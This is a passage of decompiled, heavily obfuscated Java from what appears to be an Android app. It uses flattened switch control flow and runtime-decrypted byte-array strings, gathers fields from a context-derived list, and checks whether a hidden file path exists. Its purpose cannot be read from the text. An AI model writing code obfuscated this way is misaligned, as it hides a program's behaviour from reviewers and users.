                    byte[] bArr6 = {97, D.a(i6, 3, -D1.a(i6, 1074267300), 1) ^ 527754092, 64, -23, -11, -106, (int) (((j135 | (j135 >>> 4)) & 16711935) | (((((j132 >>> 4) | j132) & 16711935) << 8) + j129)), -121, 86, 40, 44, -11, -107, -9, -117, 105, 119, -32, 23};
                    byte[] bArr7 = new byte[19];
                    bArr7[0] = 41;
                    bArr7[1] = 121;
                    bArr7[2] = -113;
                    long j136 = 1181463160;
                    long b6 = c3.b((((((((j136 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48, ((((((((j136 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((j136 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) | ((((((((j136 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16), j105, 6148914691236517205L);
                    long j137 = (b6 >>> 48) & 43690;
                    long j138 = ((j137 >>> 2) | (j137 >>> 1)) & 858993459;
                    long j139 = (j138 | (j138 >>> 2)) & 252645135;
                    long j140 = (b6 >>> 32) & 43690;
                    long j141 = ((j140 >>> 2) | (j140 >>> 1)) & 858993459;
                    long j142 = ((j141 >>> 2) | j141) & 252645135;
                    long j143 = ((((j142 >>> 4) | j142) & 16711935) << 16) + (((j139 | (j139 >>> 4)) & 16711935) << 24);
                    long j144 = (b6 >>> 16) & 43690;
                    long j145 = ((j144 >>> 2) | (j144 >>> 1)) & 858993459;
                    long j146 = ((j145 >>> 2) | j145) & 252645135;
                    long j147 = b6 & 43690;
                    long j148 = ((j147 >>> 2) | (j147 >>> 1)) & 858993459;
                    long j149 = (j148 | (j148 >>> 2)) & 252645135;
                    int i7 = ((int) (((j149 | (j149 >>> 4)) & 16711935) | (((((j146 >>> 4) | j146) & 16711935) << 8) + j143))) & 67128016;
                    long j150 = 8716576;
                    long j151 = (((((((((j150 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j150 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j150 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j150 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + j104 + 6148914691236517205L;
                    long j152 = (j151 >>> 48) & 43690;
                    long j153 = ((j152 >>> 2) | (j152 >>> 1)) & 858993459;
                    long j154 = (j153 | (j153 >>> 2)) & 252645135;
                    long j155 = (j151 >>> 32) & 43690;
                    long j156 = ((j155 >>> 2) | (j155 >>> 1)) & 858993459;
                    long j157 = ((j156 >>> 2) | j156) & 252645135;
                    long j158 = (((j154 | (j154 >>> 4)) & 16711935) << 24) | ((((j157 >>> 4) | j157) & 16711935) << 16);
                    long j159 = (j151 >>> 16) & 43690;
                    long j160 = ((j159 >>> 2) | (j159 >>> 1)) & 858993459;
                    long j161 = ((j160 >>> 2) | j160) & 252645135;
                    long j162 = j151 & 43690;
                    long j163 = ((j162 >>> 2) | (j162 >>> 1)) & 858993459;
                    long j164 = (j163 | (j163 >>> 2)) & 252645135;
                    bArr7[75844595 ^ (i7 + ((int) ((j158 | ((((j161 >>> 4) | j161) & 16711935) << 8)) | ((j164 | (j164 >>> 4)) & 16711935))))] = 30;
                    bArr7[4] = 33;
                    bArr7[5] = -75;
                    bArr7[6] = -75;
                    bArr7[7] = 33;
                    bArr7[8] = 72;
                    bArr7[9] = -92;
                    bArr7[10] = -29;
                    bArr7[11] = -68;
                    bArr7[12] = -48;
                    bArr7[13] = -1;
                    bArr7[14] = -112;
                    bArr7[15] = 87;
                    bArr7[16] = 41;
                    bArr7[17] = 55;
                    bArr7[18] = 43;
                    k(bArr6, bArr7);
                    p(new String(bArr6, StandardCharsets.UTF_8).intern(), ((StringBuilder) e4).toString());
                    return true;
                case 3930:
                    c5 = !arrayList2.isEmpty() ? (char) 34853 : (char) 44569;
                case 2757:
                    c5 = c0087u.f680b != null ? (char) 48399 : (char) 51422;
                case 51422:
                    c5 = 3032;
                case 31798:
                    sb3.append(str);
                    StringBuilder sb5 = (StringBuilder) e4;
                    byte[] bArr8 = new byte[11];
                    bArr8[0] = -103;
                    bArr8[1] = -22;
                    bArr8[2] = 89;
                    bArr8[3] = 75;
                    long j165 = -2145119167;
                    long j166 = -1;
                    long j167 = ((((((((j165 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j165 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j165 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j165 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + (((((((((j166 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j166 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j166 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j166 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))));
                    long j168 = (j167 >>> 48) & 43690;
                    long j169 = ((j168 >>> 2) | (j168 >>> 1)) & 858993459;
                    long j170 = ((j169 >>> 2) | j169) & 252645135;
                    long j171 = (j167 >>> 32) & 43690;
                    long j172 = ((j171 >>> 2) | (j171 >>> 1)) & 858993459;
                    long j173 = ((j172 >>> 2) | j172) & 252645135;
                    long j174 = ((((j173 >>> 4) | j173) & 16711935) << 16) | ((((j170 >>> 4) | j170) & 16711935) << 24);
                    long j175 = (j167 >>> 16) & 43690;
                    long j176 = ((j175 >>> 2) | (j175 >>> 1)) & 858993459;
                    long j177 = ((j176 >>> 2) | j176) & 252645135;
                    long j178 = j167 & 43690;
                    long j179 = ((j178 >>> 2) | (j178 >>> 1)) & 858993459;
                    long j180 = ((j179 >>> 2) | j179) & 252645135;
                    int i8 = (int) ((((j180 >>> 4) | j180) & 16711935) | ((((j177 >>> 4) | j177) & 16711935) << 8) | j174);
                    long j181 = 101220656;
                    long j182 = 0;
                    long j183 = (((((j182 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845;
                    long j184 = (((((((j182 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16;
                    long j185 = (((((((j182 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32;
                    long j186 = (((((((j182 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48;
                    long b7 = c3.b((((((((j181 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48, ((((((((j181 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j181 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j181 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845), j186 + (j185 | j184 | j183), 6148914691236517205L);
                    long j187 = (b7 >>> 48) & 43690;
                    long j188 = ((j187 >>> 2) | (j187 >>> 1)) & 858993459;
                    long j189 = ((j188 >>> 2) | j188) & 252645135;
                    long j190 = (b7 >>> 32) & 43690;
                    long j191 = ((j190 >>> 2) | (j190 >>> 1)) & 858993459;
                    long j192 = ((j191 >>> 2) | j191) & 252645135;
                    long j193 = ((((j192 >>> 4) | j192) & 16711935) << 16) | ((((j189 >>> 4) | j189) & 16711935) << 24);
                    long j194 = (b7 >>> 16) & 43690;
                    long j195 = ((j194 >>> 2) | (j194 >>> 1)) & 858993459;
                    long j196 = ((j195 >>> 2) | j195) & 252645135;
                    long j197 = b7 & 43690;
                    long j198 = ((j197 >>> 2) | (j197 >>> 1)) & 858993459;
                    long j199 = ((j198 >>> 2) | j198) & 252645135;
                    bArr8[(i8 + ((int) ((((j199 >>> 4) | j199) & 16711935) + (((((j196 >>> 4) | j196) & 16711935) << 8) | j193)))) ^ (-2043898507)] = 45;
                    bArr8[5] = 97;
                    bArr8[6] = 18;
                    bArr8[7] = -40;
                    bArr8[8] = 71;
                    bArr8[9] = -118;
                    bArr8[10] = 101;
                    k(bArr8, new byte[]{5, 88, -18, 34, -118, 26, -7, 100, -19, 63, 10});
                    Charset charset = StandardCharsets.UTF_8;
                    sb5.append(new String(bArr8, charset).intern());
                    sb5.append(c0087u.f684f);
                    byte[] bArr9 = {79, -90, -45, -9, -117, 111, 61, 69, 47};
                    long j200 = 1191444482;
                    long j201 = (((((((((j200 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j200 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j200 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j200 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + (j186 | (j184 + j183 + j185));
                    long j202 = (j201 >>> 48) & 43690;
                    long j203 = ((j202 >>> 2) | (j202 >>> 1)) & 858993459;
                    long j204 = ((j203 >>> 2) | j203) & 252645135;
                    long j205 = (j201 >>> 32) & 43690;
                    long j206 = ((j205 >>> 2) | (j205 >>> 1)) & 858993459;
                    long j207 = ((j206 >>> 2) | j206) & 252645135;
                    long j208 = ((((j207 >>> 4) | j207) & 16711935) << 16) + ((((j204 >>> 4) | j204) & 16711935) << 24);
                    long j209 = (j201 >>> 16) & 43690;
                    long j210 = ((j209 >>> 2) | (j209 >>> 1)) & 858993459;
                    long j211 = ((j210 >>> 2) | j210) & 252645135;
                    long j212 = j201 & 43690;
                    long j213 = ((j212 >>> 2) | (j212 >>> 1)) & 858993459;
                    long j214 = ((j213 >>> 2) | j213) & 252645135;
                    int i9 = (int) ((((j214 >>> 4) | j214) & 16711935) | (((((j211 >>> 4) | j211) & 16711935) << 8) + j208));
                    long j215 = -2122055632;
                    long j216 = i9;
                    long j217 = (((((((((j215 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j215 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j215 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j215 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + ((((((((j216 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j216 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j216 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j216 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + 6148914691236517205L;
                    long j218 = (j217 >>> 48) & 43690;
                    long j219 = ((j218 >>> 2) | (j218 >>> 1)) & 858993459;
                    long j220 = ((j219 >>> 2) | j219) & 252645135;
                    long j221 = (j217 >>> 32) & 43690;
                    long j222 = ((j221 >>> 2) | (j221 >>> 1)) & 858993459;
                    long j223 = ((j222 >>> 2) | j222) & 252645135;
                    long j224 = ((((j223 >>> 4) | j223) & 16711935) << 16) | ((((j220 >>> 4) | j220) & 16711935) << 24);
                    long j225 = (j217 >>> 16) & 43690;
                    long j226 = ((j225 >>> 2) | (j225 >>> 1)) & 858993459;
                    long j227 = ((j226 >>> 2) | j226) & 252645135;
                    long j228 = j217 & 43690;
                    long j229 = ((j228 >>> 2) | (j228 >>> 1)) & 858993459;
                    long j230 = ((j229 >>> 2) | j229) & 252645135;
                    byte[] bArr10 = new byte[(-947577537) ^ (1174478086 + ((int) ((((((j227 >>> 4) | j227) & 16711935) << 8) | j224) | (((j230 >>> 4) | j230) & 16711935))))];
                    bArr10[0] = 105;
                    bArr10[1] = 18;
                    bArr10[2] = 30;
                    bArr10[3] = 117;
                    bArr10[4] = 38;
                    bArr10[5] = 91;
                    bArr10[6] = 99;
                    bArr10[7] = 126;
                    bArr10[8] = -57;
                    k(bArr9, bArr10);
                    sb5.append(new String(bArr9, charset).intern());
                    sb5.append(c0087u.f679a);
                    byte[] bArr11 = {-120, 68, V2.a(1241811217, -537920517, -1779731734) ^ 1779731811, 107, 51, 1, -41, -115};
                    k(bArr11, new byte[]{-66, 63, 18, -112, -44, -46, -113, -104});
                    sb5.append(new String(bArr11, charset).intern());
                    sb5.append(c0087u.f682d);
                case 2566:
                    ((StringBuilder) e4).append(';');
                case 44569:
                    return false;
                case 65504:
                    try {
                        arrayList2 = AbstractC0044j.c(context);
                        c5 = 55066;
                    } catch (Exception e5) {
                        e4 = e5;
                        c5 = 40724;
                    }
                case 65118:
                    c0087u = (C0087u) it2.next();
                    c5 = ((StringBuilder) e4).length() > 0 ? (char) 2566 : (char) 21183;
                case 41909:
                    str = c0087u.f681c;
                    sb3 = sb2;
                    c5 = 31798;
                default:
            }
        }
    }

    /* JADX WARN: Failed to find 'out' block for switch in B:3:0x0061. Please report as an issue. */
    public final boolean Y() {
        char c4 = 33792;
        boolean z3 = false;
        boolean z4 = false;
        while (true) {
            switch (c4) {
                case 33792:
                    byte[] bArr = new byte[26];
                    bArr[0] = 96;
                    bArr[1] = -62;
                    bArr[2] = 78;
                    bArr[3] = -126;
                    bArr[4] = 36;
                    bArr[5] = -112;
                    long j2 = -1;
                    long j3 = 0;
                    long j4 = (((((j3 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845;
                    long j5 = (((((((j3 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16;
                    long j6 = j5 | j4;
                    long j7 = (((((((j3 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32;
                    long j8 = (((((((j3 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48;
                    long j9 = ((((((((j2 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j2 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845);
                    long j10 = (((((((j2 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32;
                    long j11 = (((((((j2 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48;
                    long j12 = j11 + j10 + j9 + j8 + (j7 | j6);
                    long j13 = (j12 >>> 48) & 21845;
                    long j14 = ((j13 >>> 1) | j13) & 858993459;
                    long j15 = ((j14 >>> 2) | j14) & 252645135;
                    long j16 = (j12 >>> 32) & 21845;
                    long j17 = ((j16 >>> 1) | j16) & 858993459;
                    long j18 = ((j17 >>> 2) | j17) & 252645135;
                    long j19 = ((((j18 >>> 4) | j18) & 16711935) << 16) | ((((j15 >>> 4) | j15) & 16711935) << 24);
                    long j20 = (j12 >>> 16) & 21845;
                    long j21 = ((j20 >>> 1) | j20) & 858993459;
                    long j22 = ((j21 >>> 2) | j21) & 252645135;
                    long j23 = j12 & 21845;
                    long j24 = ((j23 >>> 1) | j23) & 858993459;
                    long j25 = ((j24 >>> 2) | j24) & 252645135;
                    long j26 = -1180587641;
                    long j27 = (int) ((((j25 >>> 4) | j25) & 16711935) + (((((j22 >>> 4) | j22) & 16711935) << 8) | j19));
                    long b4 = c3.b((((((((j26 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48, ((((((((j26 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j26 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j26 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)), ((((((((j27 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j27 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j27 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j27 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845), 6148914691236517205L);
                    long j28 = (b4 >>> 48) & 43690;
                    long j29 = ((j28 >>> 2) | (j28 >>> 1)) & 858993459;
                    long j30 = ((j29 >>> 2) | j29) & 252645135;
                    long j31 = (b4 >>> 32) & 43690;
                    long j32 = ((j31 >>> 2) | (j31 >>> 1)) & 858993459;
                    long j33 = ((j32 >>> 2) | j32) & 252645135;
                    long j34 = ((((j33 >>> 4) | j33) & 16711935) << 16) + ((((j30 >>> 4) | j30) & 16711935) << 24);
                    long j35 = (b4 >>> 16) & 43690;
                    long j36 = ((j35 >>> 2) | (j35 >>> 1)) & 858993459;
                    long j37 = ((j36 >>> 2) | j36) & 252645135;
                    long j38 = b4 & 43690;
                    long j39 = ((j38 >>> 2) | (j38 >>> 1)) & 858993459;
                    long j40 = ((j39 >>> 2) | j39) & 252645135;
                    int i = (((int) ((((j40 >>> 4) | j40) & 16711935) + ((((j37 >>> 4) | j37) & 16711935) << 8) + j34)) & (-2147154407)) + 1074290688;
                    long j41 = -1072863713;
                    long j42 = i;
                    long j43 = ((((((((j41 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j41 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j41 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j41 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + (((((((((j42 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j42 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j42 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j42 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))));
                    long j44 = (j43 >>> 48) & 21845;
                    long j45 = ((j44 >>> 1) | j44) & 858993459;
                    long j46 = ((j45 >>> 2) | j45) & 252645135;
                    long j47 = (j43 >>> 32) & 21845;
                    long j48 = ((j47 >>> 1) | j47) & 858993459;
                    long j49 = ((j48 >>> 2) | j48) & 252645135;
                    long j50 = ((((j49 >>> 4) | j49) & 16711935) << 16) | ((((j46 >>> 4) | j46) & 16711935) << 24);
                    long j51 = (j43 >>> 16) & 21845;
                    long j52 = ((j51 >>> 1) | j51) & 858993459;
                    long j53 = ((j52 >>> 2) | j52) & 252645135;
                    long j54 = ((((j53 >>> 4) | j53) & 16711935) << 8) + j50;
                    long j55 = j43 & 21845;
                    long j56 = (j55 | (j55 >>> 1)) & 858993459;
                    long j57 = (j56 | (j56 >>> 2)) & 252645135;
                    int i3 = (int) (((j57 | (j57 >>> 4)) & 16711935) + j54);
                    long j58 = 229416453;
                    long b5 = c3.b((((((((j58 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48, ((((((((j58 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j58 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j58 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845), j11 | j10 | j9, 6148914691236517205L);
                    long j59 = (b5 >>> 48) & 43690;
                    long j60 = ((j59 >>> 2) | (j59 >>> 1)) & 858993459;
                    long j61 = ((j60 >>> 2) | j60) & 252645135;
                    long j62 = (b5 >>> 32) & 43690;
                    long j63 = ((j62 >>> 2) | (j62 >>> 1)) & 858993459;
                    long j64 = ((j63 >>> 2) | j63) & 252645135;
                    long j65 = ((((j64 >>> 4) | j64) & 16711935) << 16) | ((((j61 >>> 4) | j61) & 16711935) << 24);
                    long j66 = (b5 >>> 16) & 43690;
                    long j67 = ((j66 >>> 2) | (j66 >>> 1)) & 858993459;
                    long j68 = ((j67 >>> 2) | j67) & 252645135;
                    long j69 = b5 & 43690;
                    long j70 = ((j69 >>> 2) | (j69 >>> 1)) & 858993459;
                    long j71 = ((j70 >>> 2) | j70) & 252645135;
                    int i4 = ((int) ((((j71 >>> 4) | j71) & 16711935) | ((((j68 >>> 4) | j68) & 16711935) << 8) | j65)) & (-1054849531);
                    long j72 = 38019488;
                    long j73 = j5 + j4;
                    long j74 = j7 | j73;
                    long b6 = c3.b((((((((j72 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48, ((((((((j72 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j72 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j72 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845), j8 | j74, 6148914691236517205L);
                    long j75 = (b6 >>> 48) & 43690;
                    long j76 = ((j75 >>> 2) | (j75 >>> 1)) & 858993459;
                    long j77 = ((j76 >>> 2) | j76) & 252645135;
                    long j78 = (b6 >>> 32) & 43690;
                    long j79 = ((j78 >>> 2) | (j78 >>> 1)) & 858993459;
                    long j80 = ((j79 >>> 2) | j79) & 252645135;
                    long j81 = ((((j80 >>> 4) | j80) & 16711935) << 16) + ((((j77 >>> 4) | j77) & 16711935) << 24);
                    long j82 = (b6 >>> 16) & 43690;
                    long j83 = ((j82 >>> 2) | (j82 >>> 1)) & 858993459;
                    long j84 = ((j83 >>> 2) | j83) & 252645135;
                    long j85 = b6 & 43690;
                    long j86 = ((j85 >>> 2) | (j85 >>> 1)) & 858993459;
                    long j87 = ((j86 >>> 2) | j86) & 252645135;
                    bArr[i3] = (i4 + ((int) ((((j87 >>> 4) | j87) & 16711935) | (((((j84 >>> 4) | j84) & 16711935) << 8) | j81)))) ^ (-1016830003);
                    bArr[7] = 53;
                    bArr[8] = 60;
                    bArr[9] = -109;
                    bArr[10] = 80;
                    bArr[11] = 1;
                    bArr[12] = 53;
                    bArr[13] = 60;
                    long j88 = 37755392;
                    long j89 = (((((((((j88 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j88 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j88 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j88 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + (j8 | (j7 + j73)) + 6148914691236517205L;
                    long j90 = (j89 >>> 48) & 43690;
                    long j91 = ((j90 >>> 2) | (j90 >>> 1)) & 858993459;
                    long j92 = ((j91 >>> 2) | j91) & 252645135;
                    long j93 = (j89 >>> 32) & 43690;
                    long j94 = ((j93 >>> 2) | (j93 >>> 1)) & 858993459;
                    long j95 = ((j94 >>> 2) | j94) & 252645135;
                    long j96 = ((((j95 >>> 4) | j95) & 16711935) << 16) | ((((j92 >>> 4) | j92) & 16711935) << 24);
                    long j97 = (j89 >>> 16) & 43690;
                    long j98 = ((j97 >>> 2) | (j97 >>> 1)) & 858993459;
                    long j99 = ((j98 >>> 2) | j98) & 252645135;
                    long j100 = j89 & 43690;
                    long j101 = ((j100 >>> 2) | (j100 >>> 1)) & 858993459;
                    long j102 = ((j101 >>> 2) | j101) & 252645135;
                    bArr[1113733895 ^ (1075978505 + ((int) ((((j102 >>> 4) | j102) & 16711935) + (((((j99 >>> 4) | j99) & 16711935) << 8) | j96))))] = 41;
                    bArr[15] = -58;
                    bArr[16] = 56;
                    long j103 = 683679744;
                    long j104 = (((((((((j103 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j103 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j103 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j103 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)))) + (j8 | (j7 + j6));
                    long j105 = (j104 >>> 48) & 43690;
                    long j106 = ((j105 >>> 2) | (j105 >>> 1)) & 858993459;
                    long j107 = ((j106 >>> 2) | j106) & 252645135;
                    long j108 = (j104 >>> 32) & 43690;
                    long j109 = ((j108 >>> 2) | (j108 >>> 1)) & 858993459;
                    long j110 = ((j109 >>> 2) | j109) & 252645135;
                    long j111 = ((((j110 >>> 4) | j110) & 16711935) << 16) | ((((j107 >>> 4) | j107) & 16711935) << 24);
                    long j112 = (j104 >>> 16) & 43690;
                    long j113 = ((j112 >>> 2) | (j112 >>> 1)) & 858993459;
                    long j114 = ((j113 >>> 2) | j113) & 252645135;
                    long j115 = j104 & 43690;
                    long j116 = ((j115 >>> 2) | (j115 >>> 1)) & 858993459;
                    long j117 = ((j116 >>> 2) | j116) & 252645135;
                    int i5 = (int) ((((j117 >>> 4) | j117) & 16711935) + ((((j114 >>> 4) | j114) & 16711935) << 8) + j111);
                    int i6 = (684720672 ^ i5) + (i5 & 684720672);
                    bArr[(-1428938202) ^ ((i6 ^ 2113658857) - ((2113658857 & (~i6)) * 2))] = -14;
                    bArr[18] = -85;
                    bArr[19] = 49;
                    bArr[20] = 123;
                    bArr[21] = -95;
                    bArr[22] = 75;
                    bArr[23] = 43;
                    bArr[24] = 14;
                    bArr[25] = 8;
                    long j118 = 536873104;
                    long j119 = (((((((((j118 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j118 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j118 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j118 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)))) + j8 + j74 + 6148914691236517205L;
                    long j120 = (j119 >>> 48) & 43690;
                    long j121 = ((j120 >>> 2) | (j120 >>> 1)) & 858993459;
                    long j122 = ((j121 >>> 2) | j121) & 252645135;
                    long j123 = (j119 >>> 32) & 43690;
                    long j124 = ((j123 >>> 2) | (j123 >>> 1)) & 858993459;
                    long j125 = ((j124 >>> 2) | j124) & 252645135;
                    long j126 = ((((j125 >>> 4) | j125) & 16711935) << 16) + ((((j122 >>> 4) | j122) & 16711935) << 24);
                    long j127 = (j119 >>> 16) & 43690;
                    long j128 = ((j127 >>> 2) | (j127 >>> 1)) & 858993459;
                    long j129 = ((j128 >>> 2) | j128) & 252645135;
                    long j130 = j119 & 43690;
                    long j131 = ((j130 >>> 2) | (j130 >>> 1)) & 858993459;
                    long j132 = ((j131 >>> 2) | j131) & 252645135;
                    k(bArr, new byte[]{-96, 120, 103, -109, 114, (-648186015) ^ (111312896 + ((int) ((((j132 >>> 4) | j132) & 16711935) + (((((j129 >>> 4) | j129) & 16711935) << 8) | j126)))), 48, 55, -119, -97, -72, 8, -104, 120, -62, -126, 53, 18, 86, 13, 34, 53, 115, 93, Byte.MIN_VALUE, 15});
                    c4 = !new File(new String(bArr, StandardCharsets.UTF_8).intern()).exists() ? (char) 3733 : (char) 27534;
                case 52377:
                    break;
                case 27534:
                    z4 = false;
                    c4 = 35578;
                case 3733:
                    c4 = 35578;
                    z4 = true;
                case 42838:
                    byte[] bArr2 = new byte[23];
                    bArr2[0] = -28;
                    bArr2[1] = 110;
                    bArr2[2] = 52;
                    bArr2[3] = -53;
                    bArr2[4] = 82;
                    bArr2[5] = 74;
                    bArr2[6] = 96;
                    bArr2[7] = -117;
                    bArr2[8] = -102;
